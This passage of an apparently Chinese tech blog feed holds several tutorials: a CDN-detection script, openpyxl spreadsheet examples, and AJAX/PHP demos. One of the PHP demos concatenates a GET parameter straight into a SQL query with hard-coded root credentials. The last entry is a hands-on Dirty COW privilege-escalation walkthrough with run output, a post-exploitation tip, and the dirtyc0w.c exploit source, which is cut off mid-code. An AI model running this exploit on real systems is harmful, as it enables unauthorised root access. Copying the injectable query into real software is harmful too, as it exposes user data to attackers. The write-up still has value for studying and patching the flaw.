                &#39;presscdn.com&#39;:u&#39;Presscdn&#39;, # Presscdn
                &#39;qingcdn.com&#39;:u&#39;&#39;, # 待定
                &#39;qiniudns.com&#39;:u&#39;QiNiu&#39;, # 七牛云
                &#39;skyparkcdn.net&#39;:u&#39;&#39;, # 待定
                &#39;speedcdns.com&#39;:u&#39;QUANTIL&#39;, # QUANTIL
                &#39;sprycdn.com&#39;:u&#39;PowerLeader&#39;, # 宝腾互联
                &#39;tlgslb.com&#39;:u&#39;Dnion&#39;, # 帝联科技
                &#39;txcdn.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;txnetworks.cn&#39;:u&#39;CDNetworks&#39;, # 同兴万点
                &#39;ucloud.cn&#39;:u&#39;UCloud&#39;, # UCloud
                &#39;unicache.com&#39;:u&#39;LineFuture&#39;, # 澜景网络
                &#39;verygslb.com&#39;:u&#39;VeryCloud&#39;, # 云端网络
                &#39;vo.llnwd.net&#39;:u&#39;Limelight&#39;, # Limelight
                &#39;wscdns.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;wscloudcdn.com&#39;:u&#39;ChinaNetCenter&#39;, # 网宿科技
                &#39;xgslb.net&#39;:u&#39;Webluker&#39;, # WebLuker
                &#39;ytcdn.net&#39;:u&#39;Akamai&#39;, # Akamai
                &#39;yunjiasu-cdn&#39;:u&#39;Baiduyun&#39;, # 百度云加速
            }
        }


if __name__ == &#39;__main__&#39;:
    # url = &amp;quot;http://www.reber-9.com&amp;quot;
    url = sys.argv[1]
    cdn = CdnCheck(url)
    print cdn.check()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-结果:46839201dd3d7ca552ff68a9feb5a581&#34;&gt;0x03 结果&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;结果如下：
C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://www.reber-9.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;Baiduyun&#39;}

C:\Users\WYB_9\Desktop&amp;gt;python check_cdn.py http://v.ifeng.com
{&#39;Status&#39;: True, &#39;CDN&#39;: u&#39;ChinaCache&#39;}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python的openpyxl模块</title>
      <link>http://wyb0.com/posts/python-module-openpyxl/</link>
      <pubDate>Fri, 25 Nov 2016 17:44:23 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/python-module-openpyxl/</guid>
      <description>

&lt;blockquote&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/anime/anime001.jpg&#34; alt=&#34;夏目友人帐&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x00-openpyxl模块:066a934ccd3d0cfd20fcce987317e4e0&#34;&gt;0x00 openpyxl模块&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;这个模块可以让你读写excel文件
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-读取数据:066a934ccd3d0cfd20fcce987317e4e0&#34;&gt;0x01 读取数据&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/openpyxl_excel.png&#34; alt=&#34;excel数据&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;
代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

from openpyxl import load_workbook

wb = load_workbook(filename=&#39;aa.xlsx&#39;)

sheetnames = wb.get_sheet_names() #获得所有表名
print u&amp;quot;存在表：%s&amp;quot; % sheetnames

ws = wb.get_sheet_by_name(sheetnames[0])
print u&amp;quot;第一张表表名为：%s&amp;quot; % ws.title  #Sheet1
rows = ws.max_row  #行数
columns = ws.max_column  #列数
print &amp;quot;表%s有%d行%d列&amp;quot; % (ws.title,rows,columns)  #10 2  共10行2列


print
print u&amp;quot;取部分数据：&amp;quot;
print ws[&#39;A1&#39;].value,ws[&#39;B1&#39;].value  
print ws[&#39;A2&#39;].value,ws[&#39;B2&#39;].value
print ws.cell(row=1, column=2).value

print u&amp;quot;\n输出表%s的所有数据：&amp;quot; % ws.title
for x in range(1,rows+1):
    for y in range(1,columns+1):
        print ws.cell(row=x,column=y).value,&#39;\t&#39;,
    print
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/openpyxl_result.png&#34; alt=&#34;excel数据提取结果&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-写入数据:066a934ccd3d0cfd20fcce987317e4e0&#34;&gt;0x02 写入数据&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

from openpyxl import Workbook

wb = Workbook()

# 建表
ws1 = wb.active # 第一张表需要这样写，代表从第一张表开始
ws1.title = &#39;s1&#39;
ws2 = wb.create_sheet(title=&#39;s2&#39;)
ws3 = wb.create_sheet(title=&#39;s3&#39;)

# 写入数据
ws1[&#39;A1&#39;] = 1111
ws1[&#39;A2&#39;] = 2222
ws1[&#39;A3&#39;] = 3333
ws2[&#39;A1&#39;] = &#39;ssssssssss&#39;
ws2[&#39;B1&#39;] = &#39;dddddddddd&#39;
for x in range(1,4):
    for y in range(1,8):
        v = int(str(x)+str(y))
        _ = ws3.cell(column=x,row=y,value=v)

wb.save(filename=&#39;test.xlsx&#39;) # 保存数据
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/openpyxl_write.png&#34; alt=&#34;向excel写入数据&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>AJAX与PHP</title>
      <link>http://wyb0.com/posts/ajax-and-php/</link>
      <pubDate>Wed, 16 Nov 2016 10:37:03 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-and-php/</guid>
      <description>

&lt;h3 id=&#34;0x00-ajax与php:62baa56197da9ad463c60e4bf4026191&#34;&gt;0x00 AJAX与PHP&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;ajax.html代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
    &amp;lt;script&amp;gt;
    function showHint(str) {
        var xmlhttp;
        if (str.length==0) { 
            document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=&amp;quot;&amp;quot;;
            return;
        }
        if (window.XMLHttpRequest) {
            // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
            xmlhttp=new XMLHttpRequest(); //创建对象
        } else {
            // IE6, IE5 浏览器执行代码
            xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
        }
        xmlhttp.onreadystatechange=function() {
            if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) {
                document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=xmlhttp.responseText;
            }
        }
        xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;./ajax.php?q=&amp;quot;+str,true);
        xmlhttp.send();
    }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h3&amp;gt;在输入框中尝试输入字母 a:&amp;lt;/h3&amp;gt;
    &amp;lt;form action=&amp;quot;&amp;quot;&amp;gt; 
    输入姓名: &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;txt1&amp;quot; onkeyup=&amp;quot;showHint(this.value)&amp;quot; /&amp;gt;
    &amp;lt;/form&amp;gt;
    &amp;lt;p&amp;gt;提示信息: &amp;lt;span id=&amp;quot;txtHint&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt; 
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code&gt;上面的代码会完成以下的东西：

1. 在输入字母时会调用showHint()
2. showHint()创建对象
3. 定义onreadystatechange事件
4. xmlhttp.open()访问当前目录下的ajax.php来请求资源
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ajax.php代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
// Fill up array with names
$a[]=&amp;quot;Anna&amp;quot;;
$a[]=&amp;quot;Brittany&amp;quot;;
$a[]=&amp;quot;Cinderella&amp;quot;;
$a[]=&amp;quot;Diana&amp;quot;;
$a[]=&amp;quot;Eva&amp;quot;;
$a[]=&amp;quot;Fiona&amp;quot;;
$a[]=&amp;quot;Gunda&amp;quot;;
$a[]=&amp;quot;Hege&amp;quot;;
$a[]=&amp;quot;Inga&amp;quot;;
$a[]=&amp;quot;Johanna&amp;quot;;
$a[]=&amp;quot;Kitty&amp;quot;;
$a[]=&amp;quot;Linda&amp;quot;;
$a[]=&amp;quot;Nina&amp;quot;;
$a[]=&amp;quot;Ophelia&amp;quot;;
$a[]=&amp;quot;Petunia&amp;quot;;
$a[]=&amp;quot;Amanda&amp;quot;;
$a[]=&amp;quot;Raquel&amp;quot;;
$a[]=&amp;quot;Cindy&amp;quot;;
$a[]=&amp;quot;Doris&amp;quot;;
$a[]=&amp;quot;Eve&amp;quot;;
$a[]=&amp;quot;Evita&amp;quot;;
$a[]=&amp;quot;Sunniva&amp;quot;;
$a[]=&amp;quot;Tove&amp;quot;;
$a[]=&amp;quot;Unni&amp;quot;;
$a[]=&amp;quot;Violet&amp;quot;;
$a[]=&amp;quot;Liza&amp;quot;;
$a[]=&amp;quot;Elizabeth&amp;quot;;
$a[]=&amp;quot;Ellen&amp;quot;;
$a[]=&amp;quot;Wenche&amp;quot;;
$a[]=&amp;quot;Vicky&amp;quot;;

//get the q parameter from URL
$q=$_GET[&amp;quot;q&amp;quot;];

//lookup all hints from array if length of q&amp;gt;0
if (strlen($q) &amp;gt; 0) {
    $hint=&amp;quot;&amp;quot;;
    for($i=0; $i&amp;lt;count($a); $i++) {
        if (strtolower($q)==strtolower(substr($a[$i],0,strlen($q)))) {
            if ($hint==&amp;quot;&amp;quot;) {
                $hint=$a[$i];
            } else {
                $hint=$hint.&amp;quot; , &amp;quot;.$a[$i];
            }
        }
    }
}

// Set output to &amp;quot;no suggestion&amp;quot; if no hint were found
// or to the correct values
if ($hint == &amp;quot;&amp;quot;) {
    $response=&amp;quot;no suggestion&amp;quot;;
} else {
    $response=$hint;
}

//output the response
echo $response;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ajax_and_php.gif&#34; alt=&#34;ajax与php&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-ajax与数据库:62baa56197da9ad463c60e4bf4026191&#34;&gt;0x01 AJAX与数据库&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;可以通过xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;./ajax.php?q=&amp;quot;+str,true);的形式获取服务器数据，
那么也就可以通过这种方式获取服务端数据库中的内容
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ajax.html代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;utf-8&amp;quot;&amp;gt;
    &amp;lt;script&amp;gt;
    function showUser(str) {
        if (str==&amp;quot;&amp;quot;) {
            document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=&amp;quot;&amp;quot;;
            return;
        } 
        if (window.XMLHttpRequest) {
            // IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
            xmlhttp=new XMLHttpRequest();
        } else {
            // IE6, IE5 浏览器执行代码
            xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
        }
        xmlhttp.onreadystatechange=function() {
            if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200){
                document.getElementById(&amp;quot;txtHint&amp;quot;).innerHTML=xmlhttp.responseText;
            }
        }
        xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;getuser.php?id=&amp;quot;+str,true);
        xmlhttp.send();
    }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;form&amp;gt;
        &amp;lt;select name=&amp;quot;users&amp;quot; onchange=&amp;quot;showUser(this.value)&amp;quot;&amp;gt;
            &amp;lt;option value=&amp;quot;&amp;quot;&amp;gt;Select a person:&amp;lt;/option&amp;gt;
            &amp;lt;option value=&amp;quot;7&amp;quot;&amp;gt;用户1&amp;lt;/option&amp;gt;
            &amp;lt;option value=&amp;quot;8&amp;quot;&amp;gt;用户2&amp;lt;/option&amp;gt;
            &amp;lt;option value=&amp;quot;9&amp;quot;&amp;gt;用户3&amp;lt;/option&amp;gt;
        &amp;lt;/select&amp;gt;
    &amp;lt;/form&amp;gt;
    &amp;lt;br&amp;gt;
    &amp;lt;div id=&amp;quot;txtHint&amp;quot;&amp;gt;&amp;lt;b&amp;gt;Person info will be listed here.&amp;lt;/b&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;getuser.php代码如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    header(&amp;quot;Content-Type:text/html; charset=gbk&amp;quot;);

    $id=$_GET[&amp;quot;id&amp;quot;];

    $con = mysql_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;123456&#39;);
    mysql_select_db(&amp;quot;thinkphp&amp;quot;,$con);
    $sql=&amp;quot;SELECT * FROM msg WHERE id = &#39;&amp;quot;.$id.&amp;quot;&#39;&amp;quot;;
    $result = mysql_query($sql);

    echo &amp;quot;&amp;lt;table border=&#39;1&#39;&amp;gt;
    &amp;lt;tr&amp;gt;
    &amp;lt;th&amp;gt;Id&amp;lt;/th&amp;gt;
    &amp;lt;th&amp;gt;Name&amp;lt;/th&amp;gt;
    &amp;lt;th&amp;gt;Sex&amp;lt;/th&amp;gt;
    &amp;lt;/tr&amp;gt;&amp;quot;;

    while($row = mysql_fetch_array($result)) {
        echo &amp;quot;&amp;lt;tr&amp;gt;&amp;quot;;
        echo &amp;quot;&amp;lt;td&amp;gt;&amp;quot; . $row[&#39;id&#39;] . &amp;quot;&amp;lt;/td&amp;gt;&amp;quot;;
        echo &amp;quot;&amp;lt;td&amp;gt;&amp;quot; . $row[&#39;name&#39;] . &amp;quot;&amp;lt;/td&amp;gt;&amp;quot;;
        echo &amp;quot;&amp;lt;td&amp;gt;&amp;quot; . $row[&#39;sex&#39;] . &amp;quot;&amp;lt;/td&amp;gt;&amp;quot;;
        echo &amp;quot;&amp;lt;/tr&amp;gt;&amp;quot;;
    }
    echo &amp;quot;&amp;lt;/table&amp;gt;&amp;quot;;

    mysql_close($con);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;结果如下：

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ajax_and_mysql1.png&#34; alt=&#34;ajax与mysql1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ajax_and_mysql2.png&#34; alt=&#34;ajax与mysql2&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/ajax_and_mysql3.png&#34; alt=&#34;ajax与mysql3&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-ajax使用实例:62baa56197da9ad463c60e4bf4026191&#34;&gt;0x02 AJAX使用实例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;script&amp;gt;
        var xmlhttp;
        function loadXMLDoc(url,cfunc) {
            if (window.XMLHttpRequest) {
                // IE7+, Firefox, Chrome, Opera, Safari 代码
                xmlhttp=new XMLHttpRequest();
            } else {
                // IE6, IE5 代码
                xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
            }
            xmlhttp.onreadystatechange=cfunc;
            xmlhttp.open(&amp;quot;GET&amp;quot;,url,true);
            xmlhttp.send();
        }
        function myFunction() {
            loadXMLDoc(
                &amp;quot;/try/ajax/ajax_info.txt&amp;quot;,
                function() {
                    if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) {
                        document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML=xmlhttp.responseText;
                    }
                }
            );
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;h2&amp;gt;使用 AJAX 修改文本内容&amp;lt;/h2&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;myFunction()&amp;quot;&amp;gt;修改内容&amp;lt;/button&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>AJAX之XHR请求与响应</title>
      <link>http://wyb0.com/posts/ajax-request-and-response/</link>
      <pubDate>Tue, 25 Oct 2016 11:16:52 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-request-and-response/</guid>
      <description>

&lt;h3 id=&#34;0x00-get请求:f9a60ad247ac6e78a816c09843b6f126&#34;&gt;0x00 GET请求&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html lang=&amp;quot;en&amp;quot;&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
    &amp;lt;title&amp;gt;test&amp;lt;/title&amp;gt;
    &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt;
        function loadXMLDoc() {
            var xmlhttp;
            if (window.XMLHttpRequest) { //创建对象
                xmlhttp = new XMLHttpRequest();
            } else {
                xmlhttp = new ActiveXObjece(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
            }
        
            // readyState改变时，就会触发onreadystatechange事件
            // readyState存有XMLHttpRequest的状态，为0-4，4表示请求已完成，且响应已就绪
            // status为200代表ok，为404代表未找到页面
            xmlhttp.onreadystatechange=function() {
                if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) {
                    // xmlhttp.responseText获取来自服务器的响应
                    document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML=xmlhttp.responseText;
                }
            }

            xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;2.html?t=&amp;quot;+Math.random(),true); //GET请求，改变readyState
            // xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;2.html?name=test&amp;amp;age=23&amp;quot;,true); //GET发送信息
            xmlhttp.send();
        }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;h2&amp;gt;AJAX&amp;lt;/h2&amp;gt;
    &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;loadXMLDoc()&amp;quot;&amp;gt;Request data&amp;lt;/button&amp;gt;
    &amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;/div&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;点击&amp;rdquo;Request data&amp;rdquo;时就会请求服务端的2.html&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-post请求:f9a60ad247ac6e78a816c09843b6f126&#34;&gt;0x01 POST请求&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;// 简单的POST请求
xmlhttp.open(&amp;quot;POST&amp;quot;,&amp;quot;demo_post.html&amp;quot;,true);
xmlhttp.send();

// POST数据
xmlhttp.open(&amp;quot;POST&amp;quot;,&amp;quot;ajax_test.html&amp;quot;,true);
xmlhttp.setRequestHeader(&amp;quot;Content-type&amp;quot;,&amp;quot;application/x-www-form-urlencoded&amp;quot;);
xmlhttp.send(&amp;quot;fname=Henry&amp;amp;lname=Ford&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>AJAX初识</title>
      <link>http://wyb0.com/posts/ajax-basis/</link>
      <pubDate>Tue, 25 Oct 2016 00:53:13 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/ajax-basis/</guid>
      <description>

&lt;h3 id=&#34;0x00-什么是ajax:9eddb32fd157ed84181023f93a496e45&#34;&gt;0x00 什么是AJAX&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;AJAX全称是Asynchronous JavaScript and XML，即异步的JavaScript和XML&lt;br /&gt;
AJAX不是新的编程语言，而是一种使用现有标准的新方法。&lt;br /&gt;
AJAX可在不重新加载整个页面的情况下与服务器交换数据从而更新部分网页&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-示例:9eddb32fd157ed84181023f93a496e45&#34;&gt;0x01 示例&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;
&amp;lt;html&amp;gt;
&amp;lt;head&amp;gt;
    &amp;lt;script&amp;gt;
    function loadXMLDoc() {
        var xmlhttp;

        if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari
            xmlhttp=new XMLHttpRequest();
        } else {// code for IE6, IE5
          xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
        }

        xmlhttp.onreadystatechange=function(){
          if (xmlhttp.readyState==4 &amp;amp;&amp;amp; xmlhttp.status==200) {
            document.getElementById(&amp;quot;myDiv&amp;quot;).innerHTML=xmlhttp.responseText;
          }
        }
        xmlhttp.open(&amp;quot;GET&amp;quot;,&amp;quot;/try/ajax/ajax_info.txt&amp;quot;,true);
        xmlhttp.send();
    }
    &amp;lt;/script&amp;gt;
&amp;lt;/head&amp;gt;
&amp;lt;body&amp;gt;
    &amp;lt;div id=&amp;quot;myDiv&amp;quot;&amp;gt;&amp;lt;h2&amp;gt;使用 AJAX 修改该文本内容&amp;lt;/h2&amp;gt;&amp;lt;/div&amp;gt;
    &amp;lt;button type=&amp;quot;button&amp;quot; onclick=&amp;quot;loadXMLDoc()&amp;quot;&amp;gt;修改内容&amp;lt;/button&amp;gt;
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;当点击&amp;rdquo;修改内容&amp;rdquo;后，文本就会改变，但html页面源码没变，只向服务器请求了文本&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-关于xhr:9eddb32fd157ed84181023f93a496e45&#34;&gt;0x02 关于XHR&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;XMLHttpRequest是AJAX的基础，就是它与后台就行交互的&lt;br /&gt;
现在大部分浏览器都支持XMLHttpRequest对象(IE5和IE6使用ActiveXObject)&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;//创建对象示例
var xmlhttp;
if (window.XMLHttpRequest) {// code for IE7+,Firefox,Chrome,Opera,Safari
  xmlhttp=new XMLHttpRequest();
} else {// code for IE6, IE5
  xmlhttp=new ActiveXObject(&amp;quot;Microsoft.XMLHTTP&amp;quot;);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>脏牛漏洞</title>
      <link>http://wyb0.com/posts/dirty-cow-vulnerabilities/</link>
      <pubDate>Sat, 22 Oct 2016 00:10:46 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/dirty-cow-vulnerabilities/</guid>
      <description>

&lt;h3 id=&#34;0x00-测试环境:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x00 测试环境&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;我是在本地虚拟机测试的，个人理解这个漏洞的话可以起到的作用是：一个普通用户可以覆盖一个root用户的只读文件，若理解有误则希望大家提意见&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;CentOS release 6.5
[reber123@WYB ~]$ uname -a
Linux WYB 3.10.5-3.el6.x86_64 #1 SMP Tue Aug 20 14:10:49 UTC 2013 x86_64 x86_64 x86_64 GNU/Linux
[reber123@WYB ~]$ id
uid=502(reber123) gid=502(reber123) groups=502(reber123)
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-创建文件:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x01 创建文件&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;查看文件权限信息，可以看到属主为root，且只读，权限为0404&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ ls -al test
-r-----r-- 1 root root 19 Oct 21 00:02 test
[reber123@WYB ~]$ cat test
this is not a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-编译-执行poc:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x02 编译、执行poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;POC保存为a.c，编译为aaa&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[reber123@WYB ~]$ gcc -lpthread a.c -o aaa
[reber123@WYB ~]$ ls
aaa  a.c  test
[reber123@WYB ~]$

更改test的内容
[reber123@WYB ~]$ ./aaa test xxxxxxxxxxx
mmap f8969000

^C
[reber123@WYB ~]$ cat test
xxxxxxxxxxx a test
[reber123@WYB ~]$
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-后续利用:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x03 后续利用&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;更改用户gid为0即可

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow1.png&#34; alt=&#34;脏牛1&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/dirty_cow2.png&#34; alt=&#34;脏牛2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;提权后执行下：echo 0 &amp;gt; /proc/sys/vm/dirty_writeback_centisecs 
用来关闭pdflush刷新,否则提权后过几秒系统就会卡死
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-附poc:e2a4fc5ae2516f44e8dc71687c96e511&#34;&gt;0x04 附poc&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code&gt;/*
####################### dirtyc0w.c #######################
$ sudo -s
# echo this is not a test &amp;gt; foo
# chmod 0404 foo
$ ls -lah foo
-r-----r-- 1 root root 19 Oct 20 15:23 foo
$ cat foo
this is not a test
$ gcc -lpthread dirtyc0w.c -o dirtyc0w
$ ./dirtyc0w foo m00000000000000000
mmap 56123000
madvise 0
procselfmem 1800000000
$ cat foo
m00000000000000000
####################### dirtyc0w.c #######################
*/
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;sys/mman.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
#include &amp;lt;pthread.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
  
void *map;
int f;
struct stat st;
char *name;
  
void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i,c=0;
  for(i=0;i&amp;lt;100000000;i++)
  {
/*
You have to race madvise(MADV_DONTNEED) :: https://access.redhat.com/secu ... 06661
&amp;gt; This is achieved by racing the madvise(MADV_DONTNEED) system call
&amp;gt; while having the page of the executable mmapped in memory.
*/
    c+=madvise(map,100,MADV_DONTNEED);
  }
  printf(&amp;quot;madvise %d\n\n&amp;quot;,c);
}
  
void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
